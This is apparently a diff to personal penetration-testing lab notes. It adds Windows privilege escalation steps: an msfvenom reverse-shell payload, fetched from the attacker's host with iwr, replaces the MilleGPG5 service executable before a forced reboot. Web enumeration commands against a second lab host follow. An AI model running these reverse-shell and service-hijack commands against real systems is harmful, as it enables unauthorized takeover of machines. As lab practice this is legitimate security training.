@@ -171,4 +171,26 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=1234 -f exe
 ```
 iwr -uri http://192.168.45.234/winPEASx64.exe -Outfile winPEAS.exe
 .\winPEAS.exe
+
+# looking around at the programs I find that we can modify some exe in MilleGPG5 - so I google for it and find this - https://www.exploit-db.com/exploits/50558. We can modify multiple exe then shutdown the system to gain root
+
+cd C:\"Program Files"\MilleGPG5
+mv GPGService.exe GPGService.exe.bak
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=9999 -f exe -o shell2.exe
+
+iwr -uri http://192.168.45.234:8080/shell2.exe -Outfile GPGService.exe
+shutdown /r /t 0 
+```
+
+.156
+```
+nmap 192.168.230.156
+nmap -sT -A -p 8080 -Pn 192.168.230.156
+
+# enumerate webserver
+sudo nmap -sV -p 8080 --script "vuln" 192.168.230.156
+nikto -host 192.168.230.156 -port 8080
+whatweb http://192.168.230.156:8080
+gobuster dir -u http://192.168.230.156:8080 -w /usr/share/wordlists/dirb/common.txt
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.230.156:8080
 ```
